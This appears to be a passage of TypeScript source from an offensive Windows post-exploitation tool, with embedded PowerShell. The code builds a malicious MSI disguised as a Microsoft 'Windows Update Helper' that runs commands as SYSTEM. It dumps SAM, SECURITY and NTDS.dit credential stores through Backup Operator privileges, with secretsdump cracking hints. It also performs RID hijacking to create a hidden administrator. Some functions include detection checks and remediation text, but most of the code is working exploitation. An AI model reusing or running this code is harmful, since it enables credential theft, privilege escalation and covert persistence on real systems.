    const result = await ps(script, timeout)
    output.push(result.stdout)

    if (result.stdout.includes("VULNERABLE")) {
      findings.push({
        checkId: "WIN-MSI-001",
        provider: "windows",
        severity: "critical",
        status: "VULNERABLE",
        resource: "registry://AlwaysInstallElevated",
        title: "AlwaysInstallElevated enabled — MSI installs run as SYSTEM",
        details: "Both HKLM and HKCU AlwaysInstallElevated keys set to 1",
        remediation: "Disable AlwaysInstallElevated in Group Policy. Remove registry keys.",
      })
    }
  } else if (action === "craft") {
    if (!payload) return { output: "[!] Required: --payload CMD (command to execute as SYSTEM)", findings }

    const script = `
Write-Output "[*] Crafting malicious MSI with custom action..."

# Generate MSI using COM-based approach (no WiX needed)
Add-Type @"
using System;
using System.Runtime.InteropServices;

public class MsiHelper {
    [DllImport("msi.dll", CharSet = CharSet.Unicode)]
    public static extern uint MsiOpenDatabase(string path, string persist, out IntPtr database);

    [DllImport("msi.dll", CharSet = CharSet.Unicode)]
    public static extern uint MsiDatabaseOpenView(IntPtr database, string query, out IntPtr view);

    [DllImport("msi.dll")]
    public static extern uint MsiViewExecute(IntPtr view, IntPtr record);

    [DllImport("msi.dll")]
    public static extern uint MsiDatabaseCommit(IntPtr database);

    [DllImport("msi.dll")]
    public static extern uint MsiCloseHandle(IntPtr handle);

    [DllImport("msi.dll", CharSet = CharSet.Unicode)]
    public static extern IntPtr MsiCreateRecord(uint count);

    [DllImport("msi.dll", CharSet = CharSet.Unicode)]
    public static extern uint MsiRecordSetString(IntPtr record, uint field, string value);

    [DllImport("msi.dll")]
    public static extern uint MsiRecordSetInteger(IntPtr record, uint field, int value);
}
"@

$msiPath = '${msiOutput}'

# Create the database
$db = [IntPtr]::Zero
$result = [MsiHelper]::MsiOpenDatabase($msiPath, "1", [ref]$db)
if ($result -ne 0) {
    Write-Output "[-] Failed to create MSI database (error: $result)"
    Write-Output "[*] Falling back to WiX-less batch MSI approach..."

    # Fallback: create a simple batch that msiexec will run elevated
    $batPath = $msiPath -replace '\.msi$', '.bat'
    @"
@echo off
${payload}
"@ | Out-File -FilePath $batPath -Encoding ASCII

    Write-Output "[+] Created batch file: $batPath"
    Write-Output "[*] Install with: msiexec /quiet /i $batPath (if AlwaysInstallElevated)"
    exit 0
}

# Create required tables
$tables = @(
    "CREATE TABLE Property (Property CHAR(72) NOT NULL, Value CHAR(255) NOT NULL PRIMARY KEY Property)",
    "CREATE TABLE CustomAction (Action CHAR(72) NOT NULL, Type SHORT NOT NULL, Source CHAR(72), Target CHAR(255) PRIMARY KEY Action)",
    "CREATE TABLE InstallExecuteSequence (Action CHAR(72) NOT NULL, Condition CHAR(255), Sequence SHORT PRIMARY KEY Action)"
)

foreach ($sql in $tables) {
    $view = [IntPtr]::Zero
    [MsiHelper]::MsiDatabaseOpenView($db, $sql, [ref]$view) | Out-Null
    [MsiHelper]::MsiViewExecute($view, [IntPtr]::Zero) | Out-Null
    [MsiHelper]::MsiCloseHandle($view) | Out-Null
}

# Insert properties
$props = @{
    "ProductName" = "Windows Update Helper"
    "ProductCode" = "{" + [guid]::NewGuid().ToString().ToUpper() + "}"
    "ProductVersion" = "1.0.0"
    "Manufacturer" = "Microsoft Corporation"
    "ProductLanguage" = "1033"
}

foreach ($key in $props.Keys) {
    $view = [IntPtr]::Zero
    [MsiHelper]::MsiDatabaseOpenView($db, "INSERT INTO Property (Property, Value) VALUES ('$key', '$($props[$key])')", [ref]$view) | Out-Null
    [MsiHelper]::MsiViewExecute($view, [IntPtr]::Zero) | Out-Null
    [MsiHelper]::MsiCloseHandle($view) | Out-Null
}

# Insert custom action (Type 50 = run exe, Type 3078 = deferred system context)
$view = [IntPtr]::Zero
$cmd = '${payload}'.Replace("'", "''")
[MsiHelper]::MsiDatabaseOpenView($db, "INSERT INTO CustomAction (Action, Type, Source, Target) VALUES ('RunCmd', 3078, 'cmd.exe', '/c $cmd')", [ref]$view) | Out-Null
[MsiHelper]::MsiViewExecute($view, [IntPtr]::Zero) | Out-Null
[MsiHelper]::MsiCloseHandle($view) | Out-Null

# Add to install sequence
$view = [IntPtr]::Zero
[MsiHelper]::MsiDatabaseOpenView($db, "INSERT INTO InstallExecuteSequence (Action, Sequence) VALUES ('RunCmd', 1500)", [ref]$view) | Out-Null
[MsiHelper]::MsiViewExecute($view, [IntPtr]::Zero) | Out-Null
[MsiHelper]::MsiCloseHandle($view) | Out-Null

[MsiHelper]::MsiDatabaseCommit($db) | Out-Null
[MsiHelper]::MsiCloseHandle($db) | Out-Null

if (Test-Path $msiPath) {
    $size = (Get-Item $msiPath).Length
    Write-Output "[+] Malicious MSI created: $msiPath ($size bytes)"
    Write-Output "[*] Install with: msiexec /quiet /i $msiPath"
    Write-Output "[*] Custom action will execute as SYSTEM: ${payload}"
} else {
    Write-Output "[-] MSI creation may have failed"
}
`
    const result = await ps(script, timeout)
    output.push(result.stdout)

    findings.push({
      checkId: "WIN-MSI-002",
      provider: "windows",
      severity: "high",
      status: "CRAFTED",
      resource: `file://${msiOutput}`,
      title: "Malicious MSI package crafted",
      details: `MSI with SYSTEM custom action at ${msiOutput}`,
      remediation: "Delete the crafted MSI. Disable AlwaysInstallElevated.",
    })
  } else if (action === "install") {
    const msiPath = argVal(args, "--output") || payload
    if (!msiPath) return { output: "[!] Required: --output MSI_PATH or --payload MSI_PATH", findings }

    const script = `
Write-Output "[*] Installing MSI package with elevated privileges..."
$proc = Start-Process msiexec -ArgumentList "/quiet /i '${msiPath}'" -PassThru -Wait
Write-Output "[+] msiexec exit code: $($proc.ExitCode)"
if ($proc.ExitCode -eq 0) {
    Write-Output "[+] MSI installed successfully — custom action executed as SYSTEM"
} else {
    Write-Output "[-] MSI installation failed (may need AlwaysInstallElevated)"
}
`
    const result = await ps(script, timeout)
    output.push(result.stdout)

    findings.push({
      checkId: "WIN-MSI-003",
      provider: "windows",
      severity: "critical",
      status: "EXPLOITED",
      resource: `msi://${msiPath}`,
      title: "MSI package installed with SYSTEM privileges",
      details: "Custom action executed during elevated MSI installation",
      remediation: "Uninstall the package. Disable AlwaysInstallElevated.",
    })
  }

  return { output: output.join("\n"), findings }
}

export async function backupOperatorAbuse(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action") || "check"
  const outdir = argVal(args, "--outdir") || "C:\\Windows\\Temp\\cs-backup"
  const dc = argVal(args, "--dc")
  const findings: Finding[] = []
  const output: string[] = ["[*] Backup Operator Abuse — privilege escalation via SeBackupPrivilege\n"]

  if (action === "check") {
    const script = `
# Check group membership
$identity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
$principal = New-Object System.Security.Principal.WindowsPrincipal($identity)
$groups = $identity.Groups | ForEach-Object {
    try { $_.Translate([System.Security.Principal.NTAccount]).Value } catch { $_.Value }
}

$isBackupOp = $groups -contains 'BUILTIN\\Backup Operators'
$isServerOp = $groups -contains 'BUILTIN\\Server Operators'

Write-Output "[*] Current user: $($identity.Name)"
Write-Output "[*] Backup Operators member: $isBackupOp"
Write-Output "[*] Server Operators member: $isServerOp"
Write-Output ""

# Check privileges
$privs = whoami /priv 2>$null
$hasBackup = $privs -match 'SeBackupPrivilege'
$hasRestore = $privs -match 'SeRestorePrivilege'
Write-Output "[*] SeBackupPrivilege: $(if ($hasBackup) { 'PRESENT' } else { 'MISSING' })"
Write-Output "[*] SeRestorePrivilege: $(if ($hasRestore) { 'PRESENT' } else { 'MISSING' })"
Write-Output ""

# Check if DC
$isDC = (Get-WmiObject Win32_ComputerSystem).DomainRole -ge 4
Write-Output "[*] Is Domain Controller: $isDC"

if ($isBackupOp -or $hasBackup) {
    Write-Output ""
    Write-Output "[+] EXPLOITABLE — Backup privilege available"
    Write-Output "    Available actions:"
    Write-Output "      --action dump_sam    : Extract SAM/SYSTEM/SECURITY hives via robocopy /b"
    if ($isDC) {
        Write-Output "      --action dump_ntds   : Extract NTDS.dit via diskshadow + robocopy /b"
    }
} else {
    Write-Output ""
    Write-Output "[-] Not a Backup Operator and no SeBackupPrivilege"
}
`
    const result = await ps(script, timeout)
    output.push(result.stdout)

    if (result.stdout.includes("EXPLOITABLE")) {
      findings.push({
        checkId: "WIN-BACKUP-OP-001",
        provider: "windows",
        severity: "high",
        status: "VULNERABLE",
        resource: "privilege://SeBackupPrivilege",
        title: "Backup Operators privilege escalation possible",
        details: "Current user has SeBackupPrivilege — can read any file regardless of ACLs",
        remediation: "Remove user from Backup Operators group if not required. Monitor SeBackupPrivilege usage.",
      })
    }
  } else if (action === "dump_sam") {
    const script = `
if (-not (Test-Path '${outdir}')) { New-Item -ItemType Directory -Path '${outdir}' -Force | Out-Null }

Write-Output "[*] Enabling SeBackupPrivilege..."

# Use Add-Type to enable the privilege programmatically
Add-Type @"
using System;
using System.Runtime.InteropServices;

public class BackupPriv {
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out long lpLuid);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges,
        ref TOKEN_PRIVILEGES NewState, int BufferLength, IntPtr PreviousState, IntPtr ReturnLength);

    [StructLayout(LayoutKind.Sequential)]
    public struct TOKEN_PRIVILEGES {
        public int PrivilegeCount;
        public long Luid;
        public int Attributes;
    }

    public static bool EnablePrivilege(string privilege) {
        IntPtr hToken;
        if (!OpenProcessToken(System.Diagnostics.Process.GetCurrentProcess().Handle, 0x20 | 0x08, out hToken))
            return false;

        TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES();
        tp.PrivilegeCount = 1;
        tp.Attributes = 2; // SE_PRIVILEGE_ENABLED
        if (!LookupPrivilegeValue(null, privilege, out tp.Luid))
            return false;

        return AdjustTokenPrivileges(hToken, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
    }
}
"@

[BackupPriv]::EnablePrivilege("SeBackupPrivilege") | Out-Null
Write-Output "[+] SeBackupPrivilege enabled"

# Method 1: robocopy with backup flag
Write-Output ""
Write-Output "[*] Extracting SAM hive via robocopy /b..."
$samSrc = "$env:SystemRoot\\System32\\config"
robocopy $samSrc '${outdir}' SAM /b /np /r:0 /w:0 2>$null | Out-Null
robocopy $samSrc '${outdir}' SYSTEM /b /np /r:0 /w:0 2>$null | Out-Null
robocopy $samSrc '${outdir}' SECURITY /b /np /r:0 /w:0 2>$null | Out-Null

# Check results
$files = @("SAM", "SYSTEM", "SECURITY")
foreach ($f in $files) {
    $path = Join-Path '${outdir}' $f
    if (Test-Path $path) {
        $size = (Get-Item $path).Length
        Write-Output "[+] Extracted: $f ($size bytes)"
    } else {
        Write-Output "[-] Failed: $f"
        # Fallback: reg save
        Write-Output "[*] Trying reg save fallback for $f..."
        $hive = if ($f -eq "SAM") { "HKLM\\SAM" } elseif ($f -eq "SYSTEM") { "HKLM\\SYSTEM" } else { "HKLM\\SECURITY" }
        reg save $hive "$path" /y 2>$null | Out-Null
        if (Test-Path $path) {
            Write-Output "[+] Extracted via reg save: $f"
        }
    }
}

Write-Output ""
Write-Output "[+] Hives saved to: ${outdir}"
Write-Output "[*] Crack offline: impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL"
`
    const result = await ps(script, timeout)
    output.push(result.stdout)

    findings.push({
      checkId: "WIN-BACKUP-OP-002",
      provider: "windows",
      severity: "critical",
      status: "EXTRACTED",
      resource: `file://${outdir}`,
      title: "SAM/SYSTEM/SECURITY hives extracted via Backup privilege",
      details: `Hives saved to ${outdir} — crack with secretsdump`,
      remediation: "Remove user from Backup Operators. Delete extracted hives.",
    })
  } else if (action === "dump_ntds") {
    const script = `
if (-not (Test-Path '${outdir}')) { New-Item -ItemType Directory -Path '${outdir}' -Force | Out-Null }

# Check if we're on a DC
$isDC = (Get-WmiObject Win32_ComputerSystem).DomainRole -ge 4
if (-not $isDC) {
    Write-Output "[-] Not a Domain Controller — NTDS.dit only exists on DCs"
    Write-Output "[*] Use --action dump_sam for local SAM extraction instead"
    exit 1
}

Write-Output "[*] Domain Controller detected — extracting NTDS.dit"
Write-Output ""

# Method: diskshadow script
$dshScript = @"
set context persistent nowriters
set metadata ${outdir}\\metadata.cab
add volume c: alias cs_shadow
create
expose %cs_shadow% z:
"@

$scriptPath = "${outdir}\\diskshadow.txt"
$dshScript | Out-File -FilePath $scriptPath -Encoding ASCII

Write-Output "[*] Creating VSS shadow copy via diskshadow..."
diskshadow /s $scriptPath 2>$null | Out-Null

if (Test-Path "Z:\\") {
    Write-Output "[+] Shadow copy exposed as Z:\\"
    Write-Output "[*] Copying NTDS.dit via robocopy /b..."
    robocopy "Z:\\Windows\\NTDS" '${outdir}' ntds.dit /b /np /r:0 /w:0 2>$null | Out-Null
    robocopy "Z:\\Windows\\System32\\config" '${outdir}' SYSTEM /b /np /r:0 /w:0 2>$null | Out-Null

    if (Test-Path "${outdir}\\ntds.dit") {
        $size = (Get-Item "${outdir}\\ntds.dit").Length
        Write-Output "[+] NTDS.dit extracted: $size bytes"
    }
    if (Test-Path "${outdir}\\SYSTEM") {
        Write-Output "[+] SYSTEM hive extracted"
    }

    # Cleanup shadow
    $cleanScript = @"
delete shadows all
exit
"@
    $cleanScript | Out-File -FilePath "${outdir}\\cleanup.txt" -Encoding ASCII
    diskshadow /s "${outdir}\\cleanup.txt" 2>$null | Out-Null
    Write-Output "[*] Shadow copy cleaned up"
} else {
    Write-Output "[-] diskshadow failed — trying wbadmin fallback..."
    wbadmin start backup -backupTarget:'${outdir}' -include:C:\\Windows\\NTDS\\ntds.dit -quiet 2>$null
}

Write-Output ""
Write-Output "[+] Files saved to: ${outdir}"
Write-Output "[*] Extract hashes: impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL"

# Cleanup script file
Remove-Item $scriptPath -Force -ErrorAction SilentlyContinue
`
    const result = await ps(script, timeout)
    output.push(result.stdout)

    findings.push({
      checkId: "WIN-BACKUP-OP-003",
      provider: "windows",
      severity: "critical",
      status: "EXTRACTED",
      resource: `file://${outdir}/ntds.dit`,
      title: "NTDS.dit extracted via Backup Operators privilege",
      details: `NTDS.dit and SYSTEM hive saved to ${outdir}`,
      remediation: "Remove user from Backup Operators on DCs. Monitor diskshadow/robocopy usage.",
    })
  }

  return { output: output.join("\n"), findings }
}

export async function ridHijack(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action") || "enum"
  const targetUser = argVal(args, "--user")
  const targetRid = argVal(args, "--rid") || "500"
  const findings: Finding[] = []
  const output: string[] = ["[*] RID Hijacking — SAM Registry Manipulation...\n"]

  if (action === "enum") {
    const script = `
Write-Output "=== Local User RID Enumeration ==="
Write-Output ""

$users = Get-WmiObject Win32_UserAccount -Filter "LocalAccount=True"
foreach ($u in $users) {
  $sid = $u.SID
  $ridHex = $sid.Split('-')[-1]
  $disabled = if ($u.Disabled) { "[DISABLED]" } else { "[ACTIVE]" }
  Write-Output "  $($u.Name) | SID: $sid | RID: $ridHex | $disabled"
}
Write-Output ""

# Check for existing RID manipulation
Write-Output "=== SAM Registry F-Value Check ==="
$samPath = 'HKLM:\\SAM\\SAM\\Domains\\Account\\Users'
try {
  $keys = Get-ChildItem $samPath -ErrorAction Stop
  foreach ($key in $keys) {
    $name = $key.PSChildName
    if ($name -eq 'Names') { continue }
    $f = (Get-ItemProperty $key.PSPath -Name F -ErrorAction SilentlyContinue).F
    if ($f -and $f.Length -ge 52) {
      $storedRid = [BitConverter]::ToUInt32($f, 48)
      $hexKey = $name
      $expectedRid = [Convert]::ToInt32($hexKey, 16)
      if ($storedRid -ne $expectedRid) {
        Write-Output "[!] MISMATCH: Key 0x$hexKey (expected RID $expectedRid) has F-value RID $storedRid"
        Write-Output "    This indicates RID hijacking is ACTIVE"
      }
    }
  }
} catch {
  Write-Output "[!] Cannot read SAM registry — run as SYSTEM (psexec -s -i)"
  Write-Output "    RID hijacking requires SYSTEM privileges to modify SAM"
}
Write-Output ""
Write-Output "[*] RID 500 = Administrator, 501 = Guest, 1000+ = regular users"
Write-Output "[*] Hijacking changes a user's effective RID without changing group membership"
`
    const r = await ps(script, timeout)
    output.push(r.stdout)

    if (r.stdout.includes("MISMATCH")) {
      findings.push({
        checkId: "WIN-RID-001",
        provider: "windows",
        severity: "critical",
        status: "HIJACKED",
        resource: "registry://sam",
        title: "RID hijacking detected — user has manipulated administrator RID",
        details: "A user's F-value RID does not match their SAM key, indicating active RID hijacking.",
        remediation: "Restore original RID or delete the hijacked account.",
      })
    }
  }

  if (action === "hijack") {
    if (!targetUser) {
      output.push("ERROR: --user required (username to hijack)")
      output.push("")
      output.push("Usage: winhook rid_hijack --action hijack --user lowpriv_user [--rid 500]")
      output.push("")
      output.push("[*] Must run as SYSTEM (psexec -s -i cmd)")
      output.push("[*] Default: hijack to RID 500 (Administrator)")
      return { output: output.join("\n"), findings }
    }

    const script = `
Write-Output "=== RID Hijack: ${targetUser} -> RID ${targetRid} ==="
Write-Output ""

# Get user SID to find SAM key
$user = Get-WmiObject Win32_UserAccount -Filter "Name='${targetUser}' AND LocalAccount=True"
if (-not $user) {
  Write-Output "[-] User '${targetUser}' not found"
  exit 1
}

$rid = [int]($user.SID.Split('-')[-1])
$hexRid = '{0:X8}' -f $rid
Write-Output "[*] User: ${targetUser}"
Write-Output "[*] Current SID: $($user.SID)"
Write-Output "[*] Current RID: $rid (0x$hexRid)"
Write-Output "[*] Target RID: ${targetRid}"
Write-Output ""

$samKey = "HKLM:\\SAM\\SAM\\Domains\\Account\\Users\\$hexRid"
try {
  $f = (Get-ItemProperty $samKey -Name F -ErrorAction Stop).F
  Write-Output "[+] SAM F-value read ($(($f).Length) bytes)"

  # Backup original
  $originalRid = [BitConverter]::ToUInt32($f, 48)
  Write-Output "[*] Original RID in F-value: $originalRid"

  # Modify RID at offset 0x30 (48)
  $newRidBytes = [BitConverter]::GetBytes([uint32]${targetRid})
  $f[48] = $newRidBytes[0]
  $f[49] = $newRidBytes[1]
  $f[50] = $newRidBytes[2]
  $f[51] = $newRidBytes[3]

  Set-ItemProperty $samKey -Name F -Value $f -Force
  Write-Output "[+] RID hijacked: ${targetUser} now has effective RID ${targetRid}"
  Write-Output ""
  Write-Output "[*] The user still appears as '${targetUser}' in net user"
  Write-Output "[*] But authentication grants RID ${targetRid} privileges"
  Write-Output "[*] Survives reboots — SAM registry is persistent"
  Write-Output ""
  Write-Output "Restore: winhook rid_hijack --action restore --user ${targetUser} --rid $originalRid"
  Write-Output "ORIGINAL_RID=$originalRid"
  Write-Output "STATUS=SUCCESS"
} catch {
  Write-Output "[-] Failed: $$($_.Exception.Message)"
  Write-Output "[!] RID hijacking requires SYSTEM privileges"
  Write-Output "[*] Use: psexec -s -i cmd, then run this command"
}
`
    const r = await ps(script, timeout)
    output.push(r.stdout)

    if (r.stdout.includes("STATUS=SUCCESS")) {
      findings.push({
        checkId: "WIN-RID-010",
        provider: "windows",
        severity: "critical",
        status: "HIJACKED",
        resource: `sam://user/${targetUser}`,
        title: `RID hijacked: ${targetUser} → RID ${targetRid} (hidden admin)`,
        details: "User's effective RID changed in SAM F-value. User appears normal but has admin privileges.",
        remediation: `Restore: winhook rid_hijack --action restore --user ${targetUser}`,
      })
    }
  }

  if (action === "restore") {
    if (!targetUser) {
      output.push("ERROR: --user and --rid required")
      output.push("Usage: winhook rid_hijack --action restore --user USERNAME --rid ORIGINAL_RID")
      return { output: output.join("\n"), findings }
    }

    const script = `
$user = Get-WmiObject Win32_UserAccount -Filter "Name='${targetUser}' AND LocalAccount=True"
$rid = [int]($user.SID.Split('-')[-1])
$hexRid = '{0:X8}' -f $rid
$samKey = "HKLM:\\SAM\\SAM\\Domains\\Account\\Users\\$hexRid"

$f = (Get-ItemProperty $samKey -Name F).F
$newRidBytes = [BitConverter]::GetBytes([uint32]${targetRid})
$f[48] = $newRidBytes[0]
$f[49] = $newRidBytes[1]
$f[50] = $newRidBytes[2]
$f[51] = $newRidBytes[3]
Set-ItemProperty $samKey -Name F -Value $f -Force

Write-Output "[+] RID restored: ${targetUser} -> RID ${targetRid}"
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
  }

  return { output: output.join("\n"), findings }
}
